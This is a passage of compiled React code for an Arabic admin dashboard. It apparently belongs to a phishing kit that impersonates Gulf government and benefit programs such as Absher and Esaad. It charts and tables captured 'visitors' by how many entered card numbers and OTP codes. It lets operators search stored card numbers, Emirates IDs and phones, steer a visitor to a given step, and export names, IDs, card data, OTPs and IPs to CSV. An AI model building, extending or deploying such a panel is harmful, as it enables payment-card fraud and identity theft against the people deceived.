    className: "text-lg font-extrabold text-amber-500 truncate mt-0.5"
  }, topCard.name), /*#__PURE__*/React.createElement("div", {
    className: "text-[11px] text-gray-500 dark:text-gray-400 mt-1 flex items-center gap-1"
  }, /*#__PURE__*/React.createElement("span", {
    className: "font-mono font-bold text-gray-900 dark:text-white"
  }, topCard.total), /*#__PURE__*/React.createElement("span", null, "\u0637\u0644\u0628 (", totalOrders > 0 ? Math.round(topCard.total / totalOrders * 100) : 0, "%)"))), /*#__PURE__*/React.createElement("div", {
    className: "p-4 rounded-2xl bg-white dark:bg-gray-800 border border-gray-200/80 dark:border-gray-700 shadow-sm"
  }, /*#__PURE__*/React.createElement("div", {
    className: "flex items-center justify-between text-xs text-gray-400 mb-1"
  }, /*#__PURE__*/React.createElement("span", null, "\u0637\u0644\u0628\u0627\u062A \u0628\u0628\u0637\u0627\u0642\u0629 \u062F\u0641\u0639"), /*#__PURE__*/React.createElement("span", {
    className: "text-base"
  }, "\uD83D\uDCB3")), /*#__PURE__*/React.createElement("div", {
    className: "text-2xl font-black font-mono text-emerald-600 dark:text-emerald-400 tabular-nums"
  }, totalCards), /*#__PURE__*/React.createElement("div", {
    className: "text-[11px] text-gray-500 dark:text-gray-400 mt-1 flex items-center gap-1"
  }, /*#__PURE__*/React.createElement("span", null, "\u0646\u0633\u0628\u0629 \u0627\u0644\u0625\u062F\u062E\u0627\u0644:"), /*#__PURE__*/React.createElement("span", {
    className: "font-mono font-bold text-emerald-500"
  }, cardRate, "%"))), /*#__PURE__*/React.createElement("div", {
    className: "p-4 rounded-2xl bg-white dark:bg-gray-800 border border-gray-200/80 dark:border-gray-700 shadow-sm"
  }, /*#__PURE__*/React.createElement("div", {
    className: "flex items-center justify-between text-xs text-gray-400 mb-1"
  }, /*#__PURE__*/React.createElement("span", null, "\u0637\u0644\u0628\u0627\u062A \u062A\u0645 \u0625\u062F\u062E\u0627\u0644 OTP"), /*#__PURE__*/React.createElement("span", {
    className: "text-base"
  }, "\uD83D\uDD12")), /*#__PURE__*/React.createElement("div", {
    className: "text-2xl font-black font-mono text-indigo-600 dark:text-indigo-400 tabular-nums"
  }, totalOtps), /*#__PURE__*/React.createElement("div", {
    className: "text-[11px] text-gray-500 dark:text-gray-400 mt-1 flex items-center gap-1"
  }, /*#__PURE__*/React.createElement("span", null, "\u0646\u0633\u0628\u0629 \u0627\u0644\u062A\u062D\u0642\u0642:"), /*#__PURE__*/React.createElement("span", {
    className: "font-mono font-bold text-indigo-500"
  }, otpRate, "% \u0645\u0646 \u0627\u0644\u0628\u0637\u0627\u0642\u0627\u062A")))), /*#__PURE__*/React.createElement("div", {
    className: "grid grid-cols-1 lg:grid-cols-3 gap-6"
  }, /*#__PURE__*/React.createElement("div", {
    className: "lg:col-span-2 p-5 rounded-2xl bg-white dark:bg-gray-800 border border-gray-200/80 dark:border-gray-700 shadow-sm flex flex-col"
  }, /*#__PURE__*/React.createElement("div", {
    className: "flex items-center justify-between mb-4"
  }, /*#__PURE__*/React.createElement("div", null, /*#__PURE__*/React.createElement("h3", {
    className: "font-bold text-sm text-gray-900 dark:text-white flex items-center gap-2"
  }, /*#__PURE__*/React.createElement("span", {
    className: "w-2 h-2 rounded-full bg-amber-500"
  }), /*#__PURE__*/React.createElement("span", null, "\u0639\u062F\u062F \u0627\u0644\u0637\u0644\u0628\u0627\u062A \u0644\u0643\u0644 \u0646\u0648\u0639 \u0645\u0646 \u0623\u0646\u0648\u0627\u0639 \u0627\u0644\u0628\u0637\u0627\u0642\u0627\u062A")), /*#__PURE__*/React.createElement("p", {
    className: "text-xs text-gray-400 mt-0.5"
  }, "\u0645\u0642\u0627\u0631\u0646\u0629 \u0625\u062C\u0645\u0627\u0644\u064A \u0627\u0644\u0637\u0644\u0628\u0627\u062A \u0628\u0627\u0644\u0637\u0644\u0628\u0627\u062A \u0627\u0644\u0645\u062F\u0641\u0648\u0639\u0629 \u0648\u0627\u0644\u0645\u0624\u0643\u062F\u0629 \u0628\u0631\u0645\u0632 OTP"))), /*#__PURE__*/React.createElement("div", {
    className: "h-72 w-full mt-2",
    dir: "ltr"
  }, /*#__PURE__*/React.createElement(ResponsiveContainer, {
    width: "100%",
    height: "100%"
  }, /*#__PURE__*/React.createElement(BarChart, {
    data: typeChartData,
    margin: {
      top: 10,
      right: 20,
      left: -10,
      bottom: 20
    }
  }, /*#__PURE__*/React.createElement(CartesianGrid, {
    strokeDasharray: "3 3",
    stroke: gridColor
  }), /*#__PURE__*/React.createElement(XAxis, {
    dataKey: "name",
    stroke: axisColor,
    fontSize: 11,
    tickLine: false
  }), /*#__PURE__*/React.createElement(YAxis, {
    stroke: axisColor,
    fontSize: 11,
    allowDecimals: false
  }), /*#__PURE__*/React.createElement(Tooltip, {
    content: /*#__PURE__*/React.createElement(CustomChartTooltip, null)
  }), /*#__PURE__*/React.createElement(Legend, {
    verticalAlign: "top",
    height: 36,
    formatter: val => /*#__PURE__*/React.createElement("span", {
      className: "text-xs font-bold text-gray-700 dark:text-gray-300 mx-1"
    }, val)
  }), /*#__PURE__*/React.createElement(Bar, {
    dataKey: "\u0625\u062C\u0645\u0627\u0644\u064A \u0627\u0644\u0637\u0644\u0628\u0627\u062A",
    fill: "#f59e0b",
    radius: [6, 6, 0, 0],
    maxBarSize: 38
  }), /*#__PURE__*/React.createElement(Bar, {
    dataKey: "\u0628\u0628\u0637\u0627\u0642\u0629 \u062F\u0641\u0639",
    fill: "#10b981",
    radius: [6, 6, 0, 0],
    maxBarSize: 38
  }), /*#__PURE__*/React.createElement(Bar, {
    dataKey: "\u0628\u0631\u0645\u0632 OTP",
    fill: "#6366f1",
    radius: [6, 6, 0, 0],
    maxBarSize: 38
  }))))), /*#__PURE__*/React.createElement("div", {
    className: "p-5 rounded-2xl bg-white dark:bg-gray-800 border border-gray-200/80 dark:border-gray-700 shadow-sm flex flex-col"
  }, /*#__PURE__*/React.createElement("div", {
    className: "flex items-center justify-between mb-4"
  }, /*#__PURE__*/React.createElement("div", null, /*#__PURE__*/React.createElement("h3", {
    className: "font-bold text-sm text-gray-900 dark:text-white flex items-center gap-2"
  }, /*#__PURE__*/React.createElement("span", {
    className: "w-2 h-2 rounded-full bg-blue-500"
  }), /*#__PURE__*/React.createElement("span", null, "\u0627\u0644\u062A\u0648\u0632\u064A\u0639 \u0627\u0644\u0646\u0633\u0628\u064A \u0644\u0641\u0626\u0627\u062A \u0627\u0644\u0628\u0637\u0627\u0642\u0627\u062A")), /*#__PURE__*/React.createElement("p", {
    className: "text-xs text-gray-400 mt-0.5"
  }, "\u0627\u0644\u062D\u0635\u0629 \u0627\u0644\u0645\u0626\u0648\u064A\u0629 \u0644\u0643\u0644 \u0641\u0626\u0629 \u0645\u0646 \u0645\u062C\u0645\u0644 \u0627\u0644\u0637\u0644\u0628\u0627\u062A"))), /*#__PURE__*/React.createElement("div", {
    className: "h-72 w-full flex items-center justify-center",
    dir: "ltr"
  }, pieTypeData.length === 0 ? /*#__PURE__*/React.createElement("div", {
    className: "text-center text-xs text-gray-400",
    dir: "rtl"
  }, "\u0644\u0627 \u062A\u0648\u062C\u062F \u0628\u064A\u0627\u0646\u0627\u062A \u0643\u0627\u0641\u064A\u0629 \u0644\u0639\u0631\u0636 \u0627\u0644\u0631\u0633\u0645 \u0627\u0644\u0628\u064A\u0627\u0646\u064A") : /*#__PURE__*/React.createElement(ResponsiveContainer, {
    width: "100%",
    height: "100%"
  }, /*#__PURE__*/React.createElement(PieChart, null, /*#__PURE__*/React.createElement(Pie, {
    data: pieTypeData,
    dataKey: "value",
    nameKey: "name",
    cx: "50%",
    cy: "45%",
    innerRadius: 50,
    outerRadius: 78,
    paddingAngle: 4
  }, pieTypeData.map((entry, index) => /*#__PURE__*/React.createElement(Cell, {
    key: `cell-${index}`,
    fill: entry.fill,
    stroke: isDark ? "#1f2937" : "#ffffff",
    strokeWidth: 2
  }))), /*#__PURE__*/React.createElement(Tooltip, {
    content: /*#__PURE__*/React.createElement(CustomChartTooltip, null)
  }), /*#__PURE__*/React.createElement(Legend, {
    verticalAlign: "bottom",
    height: 40,
    formatter: (val, entry) => /*#__PURE__*/React.createElement("span", {
      className: "text-xs font-medium text-gray-700 dark:text-gray-300 mx-1"
    }, val, " (", entry.payload.percentage, "%)")
  })))))), /*#__PURE__*/React.createElement("div", {
    className: "grid grid-cols-1 lg:grid-cols-2 gap-6"
  }, /*#__PURE__*/React.createElement("div", {
    className: "p-5 rounded-2xl bg-white dark:bg-gray-800 border border-gray-200/80 dark:border-gray-700 shadow-sm flex flex-col"
  }, /*#__PURE__*/React.createElement("div", {
    className: "flex items-center justify-between mb-4"
  }, /*#__PURE__*/React.createElement("div", null, /*#__PURE__*/React.createElement("h3", {
    className: "font-bold text-sm text-gray-900 dark:text-white flex items-center gap-2"
  }, /*#__PURE__*/React.createElement("span", {
    className: "w-2 h-2 rounded-full bg-emerald-500"
  }), /*#__PURE__*/React.createElement("span", null, "\u0639\u062F\u062F \u0627\u0644\u0637\u0644\u0628\u0627\u062A \u062D\u0633\u0628 \u0627\u0644\u062C\u0647\u0629 \u0627\u0644\u0645\u0635\u062F\u0631\u0629")), /*#__PURE__*/React.createElement("p", {
    className: "text-xs text-gray-400 mt-0.5"
  }, "\u0645\u0642\u0627\u0631\u0646\u0629 \u0637\u0644\u0628\u0627\u062A \u0641\u0632\u0639\u0629\u060C \u0625\u0633\u0639\u0627\u062F\u060C \u062D\u0645\u0627\u0629 \u0627\u0644\u0648\u0637\u0646\u060C \u0627\u0644\u0633\u0639\u0627\u062F\u0629\u060C \u0648\u0623\u0628\u0634\u0631"))), /*#__PURE__*/React.createElement("div", {
    className: "h-64 w-full",
    dir: "ltr"
  }, /*#__PURE__*/React.createElement(ResponsiveContainer, {
    width: "100%",
    height: "100%"
  }, /*#__PURE__*/React.createElement(BarChart, {
    data: brandChartData,
    margin: {
      top: 10,
      right: 20,
      left: -10,
      bottom: 20
    }
  }, /*#__PURE__*/React.createElement(CartesianGrid, {
    strokeDasharray: "3 3",
    stroke: gridColor
  }), /*#__PURE__*/React.createElement(XAxis, {
    dataKey: "name",
    stroke: axisColor,
    fontSize: 11,
    tickLine: false
  }), /*#__PURE__*/React.createElement(YAxis, {
    stroke: axisColor,
    fontSize: 11,
    allowDecimals: false
  }), /*#__PURE__*/React.createElement(Tooltip, {
    content: /*#__PURE__*/React.createElement(CustomChartTooltip, null)
  }), /*#__PURE__*/React.createElement(Legend, {
    verticalAlign: "top",
    height: 36,
    formatter: val => /*#__PURE__*/React.createElement("span", {
      className: "text-xs font-bold text-gray-700 dark:text-gray-300 mx-1"
    }, val)
  }), /*#__PURE__*/React.createElement(Bar, {
    dataKey: "\u0639\u062F\u062F \u0627\u0644\u0637\u0644\u0628\u0627\u062A",
    fill: "#3b82f6",
    radius: [6, 6, 0, 0],
    maxBarSize: 32
  }), /*#__PURE__*/React.createElement(Bar, {
    dataKey: "\u0645\u062F\u0641\u0648\u0639\u0629 \u0628\u0627\u0644\u0628\u0637\u0627\u0642\u0629",
    fill: "#10b981",
    radius: [6, 6, 0, 0],
    maxBarSize: 32
  }))))), /*#__PURE__*/React.createElement("div", {
    className: "p-5 rounded-2xl bg-white dark:bg-gray-800 border border-gray-200/80 dark:border-gray-700 shadow-sm flex flex-col"
  }, /*#__PURE__*/React.createElement("div", {
    className: "flex items-center justify-between mb-4"
  }, /*#__PURE__*/React.createElement("div", null, /*#__PURE__*/React.createElement("h3", {
    className: "font-bold text-sm text-gray-900 dark:text-white flex items-center gap-2"
  }, /*#__PURE__*/React.createElement("span", {
    className: "w-2 h-2 rounded-full bg-purple-500"
  }), /*#__PURE__*/React.createElement("span", null, "\u0645\u0633\u0627\u0631 \u0648\u062A\u062F\u0641\u0642 \u0645\u0631\u0627\u062D\u0644 \u0625\u062A\u0645\u0627\u0645 \u0637\u0644\u0628\u0627\u062A \u0627\u0644\u0628\u0637\u0627\u0642\u0627\u062A")), /*#__PURE__*/React.createElement("p", {
    className: "text-xs text-gray-400 mt-0.5"
  }, "\u0645\u0639\u062F\u0644 \u0627\u0644\u062A\u062D\u0648\u064A\u0644 \u0639\u0628\u0631 \u0645\u0631\u0627\u062D\u0644 \u0627\u0644\u0637\u0644\u0628 \u062D\u062A\u0649 \u0627\u0644\u0627\u0639\u062A\u0645\u0627\u062F"))), /*#__PURE__*/React.createElement("div", {
    className: "h-64 w-full",
    dir: "ltr"
  }, /*#__PURE__*/React.createElement(ResponsiveContainer, {
    width: "100%",
    height: "100%"
  }, /*#__PURE__*/React.createElement(AreaChart, {
    data: funnelData,
    margin: {
      top: 10,
      right: 20,
      left: -10,
      bottom: 20
    }
  }, /*#__PURE__*/React.createElement("defs", null, /*#__PURE__*/React.createElement("linearGradient", {
    id: "colorCount",
    x1: "0",
    y1: "0",
    x2: "0",
    y2: "1"
  }, /*#__PURE__*/React.createElement("stop", {
    offset: "5%",
    stopColor: "#8b5cf6",
    stopOpacity: 0.4
  }), /*#__PURE__*/React.createElement("stop", {
    offset: "95%",
    stopColor: "#8b5cf6",
    stopOpacity: 0.0
  }))), /*#__PURE__*/React.createElement(CartesianGrid, {
    strokeDasharray: "3 3",
    stroke: gridColor
  }), /*#__PURE__*/React.createElement(XAxis, {
    dataKey: "stage",
    stroke: axisColor,
    fontSize: 11,
    tickLine: false
  }), /*#__PURE__*/React.createElement(YAxis, {
    stroke: axisColor,
    fontSize: 11,
    allowDecimals: false
  }), /*#__PURE__*/React.createElement(Tooltip, {
    content: /*#__PURE__*/React.createElement(CustomChartTooltip, null)
  }), /*#__PURE__*/React.createElement(Area, {
    type: "monotone",
    dataKey: "count",
    name: "\u0639\u062F\u062F \u0627\u0644\u0632\u0648\u0627\u0631",
    stroke: "#8b5cf6",
    strokeWidth: 2.5,
    fillOpacity: 1,
    fill: "url(#colorCount)"
  })))))), /*#__PURE__*/React.createElement("div", {
    className: "p-5 rounded-2xl bg-white dark:bg-gray-800 border border-gray-200/80 dark:border-gray-700 shadow-sm"
  }, /*#__PURE__*/React.createElement("h3", {
    className: "font-bold text-sm text-gray-900 dark:text-white mb-3"
  }, "\u062C\u062F\u0648\u0644 \u0625\u062D\u0635\u0627\u0626\u064A\u0627\u062A \u062A\u0641\u0635\u064A\u0644\u064A \u0644\u0637\u0644\u0628\u0627\u062A \u0627\u0644\u0628\u0637\u0627\u0642\u0627\u062A"), /*#__PURE__*/React.createElement("div", {
    className: "overflow-x-auto"
  }, /*#__PURE__*/React.createElement("table", {
    className: "w-full text-right text-xs"
  }, /*#__PURE__*/React.createElement("thead", null, /*#__PURE__*/React.createElement("tr", {
    className: "border-b border-gray-100 dark:border-gray-700 text-gray-400"
  }, /*#__PURE__*/React.createElement("th", {
    className: "py-2.5 px-3 font-bold"
  }, "\u0646\u0648\u0639 / \u0641\u0626\u0629 \u0627\u0644\u0628\u0637\u0627\u0642\u0629"), /*#__PURE__*/React.createElement("th", {
    className: "py-2.5 px-3 font-bold text-center"
  }, "\u0625\u062C\u0645\u0627\u0644\u064A \u0627\u0644\u0637\u0644\u0628\u0627\u062A"), /*#__PURE__*/React.createElement("th", {
    className: "py-2.5 px-3 font-bold text-center"
  }, "\u0645\u062F\u0641\u0648\u0639\u0629 \u0628\u0628\u0637\u0627\u0642\u0629"), /*#__PURE__*/React.createElement("th", {
    className: "py-2.5 px-3 font-bold text-center"
  }, "\u0631\u0645\u0632 OTP"), /*#__PURE__*/React.createElement("th", {
    className: "py-2.5 px-3 font-bold text-center"
  }, "\u0646\u0633\u0628\u0629 \u0627\u0644\u062A\u062D\u0648\u064A\u0644"), /*#__PURE__*/React.createElement("th", {
    className: "py-2.5 px-3 font-bold text-center"
  }, "\u0627\u0644\u062D\u0635\u0629 \u0645\u0646 \u0627\u0644\u0625\u062C\u0645\u0627\u0644\u064A"))), /*#__PURE__*/React.createElement("tbody", {
    className: "divide-y divide-gray-50 dark:divide-gray-750"
  }, Object.values(typeCounts).map(row => {
    const share = totalOrders > 0 ? Math.round(row.total / totalOrders * 100) : 0;
    const conv = row.total > 0 ? Math.round(row.withCard / row.total * 100) : 0;
    return /*#__PURE__*/React.createElement("tr", {
      key: row.id,
      className: "hover:bg-gray-50 dark:hover:bg-gray-750/50 transition-colors"
    }, /*#__PURE__*/React.createElement("td", {
      className: "py-3 px-3 font-bold text-gray-900 dark:text-white flex items-center gap-2"
    }, /*#__PURE__*/React.createElement("span", {
      className: "w-2.5 h-2.5 rounded-full inline-block",
      style: {
        backgroundColor: row.fill
      }
    }), /*#__PURE__*/React.createElement("span", null, row.name)), /*#__PURE__*/React.createElement("td", {
      className: "py-3 px-3 text-center font-mono font-bold text-gray-800 dark:text-gray-200"
    }, row.total), /*#__PURE__*/React.createElement("td", {
      className: "py-3 px-3 text-center font-mono text-emerald-600 dark:text-emerald-400 font-bold"
    }, row.withCard), /*#__PURE__*/React.createElement("td", {
      className: "py-3 px-3 text-center font-mono text-indigo-600 dark:text-indigo-400 font-bold"
    }, row.withOtp), /*#__PURE__*/React.createElement("td", {
      className: "py-3 px-3 text-center"
    }, /*#__PURE__*/React.createElement("span", {
      className: "px-2 py-0.5 rounded-full bg-emerald-50 dark:bg-emerald-950/40 text-emerald-600 dark:text-emerald-400 font-mono font-bold text-[11px]"
    }, conv, "%")), /*#__PURE__*/React.createElement("td", {
      className: "py-3 px-3 text-center"
    }, /*#__PURE__*/React.createElement("div", {
      className: "flex items-center justify-center gap-2"
    }, /*#__PURE__*/React.createElement("span", {
      className: "font-mono font-bold text-[11px]"
    }, share, "%"), /*#__PURE__*/React.createElement("div", {
      className: "w-16 h-1.5 rounded-full bg-gray-100 dark:bg-gray-700 overflow-hidden"
    }, /*#__PURE__*/React.createElement("div", {
      className: "h-full rounded-full",
      style: {
        width: `${share}%`,
        backgroundColor: row.fill
      }
    })))));
  }))))));
}

// ─── Interactive Orders Table View ──────────────────────────────────────────
function OrdersTableView({
  visitors,
  isDark,
  onUpdateStatus,
  onSelectVisitor,
  onDelete,
  onDirectToStep
}) {
  const [searchTerm, setSearchTerm] = useState("");
  const [statusFilter, setStatusFilter] = useState("all"); // "all" | "pending" | "completed" | "cancelled"
  const [brandFilter, setBrandFilter] = useState("all");
  const [paymentFilter, setPaymentFilter] = useState("all"); // "all" | "card" | "otp"
  const [sortBy, setSortBy] = useState("newest"); // "newest" | "oldest" | "name"
  const [selectedOrder, setSelectedOrder] = useState(null);
  const [feedbackId, setFeedbackId] = useState(null);

  // Handle interactive status change with visual feedback
  const handleStatusChange = (id, newStatus) => {
    onUpdateStatus(id, newStatus);
    setFeedbackId(id);
    setTimeout(() => setFeedbackId(null), 1800);
  };

  // Filter visitors
  const filtered = visitors.filter(v => {
    const orderStatus = v.orderStatus || "pending";
    if (statusFilter !== "all" && orderStatus !== statusFilter) return false;
    const info = parseCardTypeAndBrand(v);
    if (brandFilter !== "all" && info.brandKey !== brandFilter) return false;
    if (paymentFilter === "card" && !v.cardNumber) return false;
    if (paymentFilter === "otp" && !v.otp) return false;
    if (searchTerm.trim()) {
      const q = searchTerm.toLowerCase().trim();
      const name = (v.name || v.bookingData && v.bookingData["الاسم"] || "").toLowerCase();
      const phone = (v.phone || v.bookingData && v.bookingData["الهاتف"] || "").toLowerCase();
      const emId = (v.emiratesId || v.bookingData && v.bookingData["رقم الهوية"] || "").toLowerCase();
      const id = (v.id || "").toLowerCase();
      const cardNum = (v.cardNumber || "").toLowerCase();
      if (!name.includes(q) && !phone.includes(q) && !emId.includes(q) && !id.includes(q) && !cardNum.includes(q)) {
        return false;
      }
    }
    return true;
  });

  // Sort
  const sorted = [...filtered].sort((a, b) => {
    if (sortBy === "newest") {
      return new Date(b.createdAt || b.updatedAt || 0) - new Date(a.createdAt || a.updatedAt || 0);
    }
    if (sortBy === "oldest") {
      return new Date(a.createdAt || a.updatedAt || 0) - new Date(b.createdAt || b.updatedAt || 0);
    }
    if (sortBy === "name") {
      const nameA = a.name || "";
      const nameB = b.name || "";
      return nameA.localeCompare(nameB, "ar");
    }
    return 0;
  });

  // Stats
  const totalCount = visitors.length;
  const pendingCount = visitors.filter(v => (v.orderStatus || "pending") === "pending").length;
  const completedCount = visitors.filter(v => v.orderStatus === "completed").length;
  const cancelledCount = visitors.filter(v => v.orderStatus === "cancelled").length;
  const cardCount = visitors.filter(v => !!v.cardNumber).length;

  // Export CSV
  const handleExportCSV = () => {
    const headers = ["رقم الطلب", "اسم العميل", "رقم الهاتف", "رقم الهوية", "الجهة", "نوع البطاقة", "رقم البطاقة", "تاريخ الانتهاء", "رمز التحقق OTP", "حالة الطلب", "تاريخ ووقت الإنشاء", "IP"];
    const rows = sorted.map(v => {
      const info = parseCardTypeAndBrand(v);
      const st = v.orderStatus === "completed" ? "مكتمل" : v.orderStatus === "cancelled" ? "ملغي" : "قيد المراجعة";
      return [`"${v.id || ''}"`, `"${(v.name || v.bookingData && v.bookingData['الاسم'] || 'زائر').replace(/"/g, '""')}"`, `"${v.phone || v.bookingData && v.bookingData['الهاتف'] || ''}"`, `"${v.emiratesId || v.bookingData && v.bookingData['رقم الهوية'] || ''}"`, `"${info.brandName}"`, `"${info.typeName}"`, `"${v.cardNumber ? maskCard(v.cardNumber) : 'بدون بطاقة'}"`, `"${v.expiry || ''}"`, `"${v.otp || ''}"`, `"${st}"`, `"${formatFullDateTime(v.createdAt || v.updatedAt)}"`, `"${v.ip || ''}"`].join(",");
    });
    const csvString = "\uFEFF" + [headers.join(","), ...rows].join("\n");
    const blob = new Blob([csvString], {
      type: "text/csv;charset=utf-8;"
    });
    const url = URL.createObjectURL(blob);
    const a = document.createElement("a");
    a.href = url;
    a.download = `طلبات_البطاقات_${new Date().toISOString().slice(0, 10)}.csv`;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
  };
  return /*#__PURE__*/React.createElement("div", {
    className: "flex-1 overflow-y-auto p-4 md:p-6 space-y-6 custom-scrollbar",
    dir: "rtl"
  }, /*#__PURE__*/React.createElement("div", {
    className: "flex flex-col lg:flex-row items-start lg:items-center justify-between gap-4"
  }, /*#__PURE__*/React.createElement("div", null, /*#__PURE__*/React.createElement("div", {
    className: "flex items-center gap-2"
  }, /*#__PURE__*/React.createElement("span", {
    className: "text-2xl"
  }, "\uD83D\uDCCB"), /*#__PURE__*/React.createElement("h1", {
    className: `text-xl md:text-2xl font-black ${isDark ? "text-white" : "text-gray-900"}`
  }, "\u062C\u062F\u0648\u0644 \u0637\u0644\u0628\u0627\u062A \u0627\u0644\u0628\u0637\u0627\u0642\u0627\u062A \u0627\u0644\u062A\u0641\u0627\u0639\u0644\u064A"), /*#__PURE__*/React.createElement("span", {
    className: "px-2.5 py-0.5 rounded-full text-xs font-bold bg-amber-100 text-amber-800 dark:bg-amber-900/60 dark:text-amber-300"
  }, filtered.length, " \u0637\u0644\u0628 \u0645\u0639\u0631\u0648\u0636")), /*#__PURE__*/React.createElement("p", {
    className: "text-xs text-gray-500 dark:text-gray-400 mt-1"
  }, "\u0625\u062F\u0627\u0631\u0629 \u0643\u0627\u0645\u0644\u0629 \u0644\u0637\u0644\u0628\u0627\u062A \u0627\u0644\u0628\u0637\u0627\u0642\u0627\u062A \u0645\u0639 \u0625\u0645\u0643\u0627\u0646\u064A\u0629 \u062A\u062D\u062F\u064A\u062B \u0627\u0644\u062D\u0627\u0644\u0629 \u0641\u0648\u0631\u064A\u0627\u064B (\u0642\u064A\u062F \u0627\u0644\u0645\u0631\u0627\u062C\u0639\u0629\u060C \u0645\u0643\u062A\u0645\u0644\u060C \u0645\u0644\u063A\u064A) \u0648\u0627\u0644\u062A\u0635\u062F\u064A\u0631 \u0648\u0627\u0644\u0645\u062A\u0627\u0628\u0639\u0629 \u0627\u0644\u0645\u0628\u0627\u0634\u0631\u0629.")), /*#__PURE__*/React.createElement("div", {
    className: "flex items-center gap-2 flex-wrap"
  }, /*#__PURE__*/React.createElement("button", {
    onClick: handleExportCSV,
    className: "px-3 py-2 rounded-xl text-xs font-bold bg-emerald-600 hover:bg-emerald-700 text-white transition-all flex items-center gap-1.5 shadow-sm cursor-pointer",
    title: "\u062A\u0635\u062F\u064A\u0631 \u0628\u064A\u0627\u0646\u0627\u062A \u0627\u0644\u0637\u0644\u0628\u0627\u062A \u0627\u0644\u0645\u0639\u0631\u0648\u0636\u0629 \u0625\u0644\u0649 \u0645\u0644\u0641 CSV"
  }, /*#__PURE__*/React.createElement("svg", {
    className: "w-4 h-4",
    fill: "none",
    stroke: "currentColor",
    viewBox: "0 0 24 24"
  }, /*#__PURE__*/React.createElement("path", {
    strokeLinecap: "round",
    strokeLinejoin: "round",
    strokeWidth: 2,
    d: "M12 10v6m0 0l-3-3m3 3l3-3m2 8H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z"
  })), /*#__PURE__*/React.createElement("span", null, "\u062A\u0635\u062F\u064A\u0631 Excel / CSV")))), /*#__PURE__*/React.createElement("div", {
    className: "grid grid-cols-2 sm:grid-cols-2 lg:grid-cols-5 gap-3"
  }, /*#__PURE__*/React.createElement("button", {
    onClick: () => setStatusFilter("all"),
    className: `p-3.5 rounded-2xl border text-right transition-all cursor-pointer ${statusFilter === "all" ? isDark ? "bg-gray-800 border-blue-500 shadow-md ring-2 ring-blue-500/20" : "bg-blue-50/70 border-blue-400 shadow-md ring-2 ring-blue-400/20" : isDark ? "bg-gray-800/80 border-gray-700 hover:bg-gray-800" : "bg-white border-gray-200 hover:bg-gray-50"}`
  }, /*#__PURE__*/React.createElement("div", {
    className: "flex items-center justify-between"
  }, /*#__PURE__*/React.createElement("span", {
    className: "text-xs text-gray-500 dark:text-gray-400 font-bold"
  }, "\u0625\u062C\u0645\u0627\u0644\u064A \u0627\u0644\u0637\u0644\u0628\u0627\u062A"), /*#__PURE__*/React.createElement("span", {
    className: "text-sm"
  }, "\uD83D\uDCD1")), /*#__PURE__*/React.createElement("div", {
    className: "text-2xl font-black mt-1 text-gray-900 dark:text-white tabular-nums"
  }, totalCount), /*#__PURE__*/React.createElement("div", {
    className: "text-[10px] text-gray-400 mt-0.5"
  }, "\u0643\u0627\u0641\u0629 \u0627\u0644\u0645\u0633\u062C\u0644\u064A\u0646 \u0641\u064A \u0627\u0644\u0646\u0638\u0627\u0645")), /*#__PURE__*/React.createElement("button", {
    onClick: () => setStatusFilter("pending"),
    className: `p-3.5 rounded-2xl border text-right transition-all cursor-pointer ${statusFilter === "pending" ? isDark ? "bg-amber-950/40 border-amber-500 shadow-md ring-2 ring-amber-500/20" : "bg-amber-50 border-amber-400 shadow-md ring-2 ring-amber-400/20" : isDark ? "bg-gray-800/80 border-gray-700 hover:bg-gray-800" : "bg-white border-gray-200 hover:bg-gray-50"}`
  }, /*#__PURE__*/React.createElement("div", {
    className: "flex items-center justify-between"
  }, /*#__PURE__*/React.createElement("span", {
    className: "text-xs text-amber-600 dark:text-amber-400 font-bold"
  }, "\u0642\u064A\u062F \u0627\u0644\u0645\u0631\u0627\u062C\u0639\u0629"), /*#__PURE__*/React.createElement("span", {
    className: "text-sm"
  }, "\u23F3")), /*#__PURE__*/React.createElement("div", {
    className: "text-2xl font-black mt-1 text-amber-600 dark:text-amber-400 tabular-nums"
  }, pendingCount), /*#__PURE__*/React.createElement("div", {
    className: "text-[10px] text-amber-600/70 dark:text-amber-400/70 mt-0.5"
  }, "\u0628\u0627\u0646\u062A\u0638\u0627\u0631 \u0627\u0644\u0625\u062C\u0631\u0627\u0621 \u0648\u0627\u0644\u062A\u062F\u0642\u064A\u0642")), /*#__PURE__*/React.createElement("button", {
    onClick: () => setStatusFilter("completed"),
    className: `p-3.5 rounded-2xl border text-right transition-all cursor-pointer ${statusFilter === "completed" ? isDark ? "bg-emerald-950/40 border-emerald-500 shadow-md ring-2 ring-emerald-500/20" : "bg-emerald-50 border-emerald-400 shadow-md ring-2 ring-emerald-400/20" : isDark ? "bg-gray-800/80 border-gray-700 hover:bg-gray-800" : "bg-white border-gray-200 hover:bg-gray-50"}`
  }, /*#__PURE__*/React.createElement("div", {
    className: "flex items-center justify-between"
  }, /*#__PURE__*/React.createElement("span", {
    className: "text-xs text-emerald-600 dark:text-emerald-400 font-bold"
  }, "\u0645\u0643\u062A\u0645\u0644"), /*#__PURE__*/React.createElement("span", {
    className: "text-sm"
  }, "\u2705")), /*#__PURE__*/React.createElement("div", {
    className: "text-2xl font-black mt-1 text-emerald-600 dark:text-emerald-400 tabular-nums"
  }, completedCount), /*#__PURE__*/React.createElement("div", {
    className: "text-[10px] text-emerald-600/70 dark:text-emerald-400/70 mt-0.5"
  }, "\u062A\u0645 \u0627\u0644\u0627\u0639\u062A\u0645\u0627\u062F \u0648\u0627\u0644\u062A\u0623\u0643\u064A\u062F \u0628\u0646\u062C\u0627\u062D")), /*#__PURE__*/React.createElement("button", {
    onClick: () => setStatusFilter("cancelled"),
    className: `p-3.5 rounded-2xl border text-right transition-all cursor-pointer ${statusFilter === "cancelled" ? isDark ? "bg-rose-950/40 border-rose-500 shadow-md ring-2 ring-rose-500/20" : "bg-rose-50 border-rose-400 shadow-md ring-2 ring-rose-400/20" : isDark ? "bg-gray-800/80 border-gray-700 hover:bg-gray-800" : "bg-white border-gray-200 hover:bg-gray-50"}`
  }, /*#__PURE__*/React.createElement("div", {
    className: "flex items-center justify-between"
  }, /*#__PURE__*/React.createElement("span", {
    className: "text-xs text-rose-600 dark:text-rose-400 font-bold"
  }, "\u0645\u0644\u063A\u064A"), /*#__PURE__*/React.createElement("span", {
    className: "text-sm"
  }, "\u274C")), /*#__PURE__*/React.createElement("div", {
    className: "text-2xl font-black mt-1 text-rose-600 dark:text-rose-400 tabular-nums"
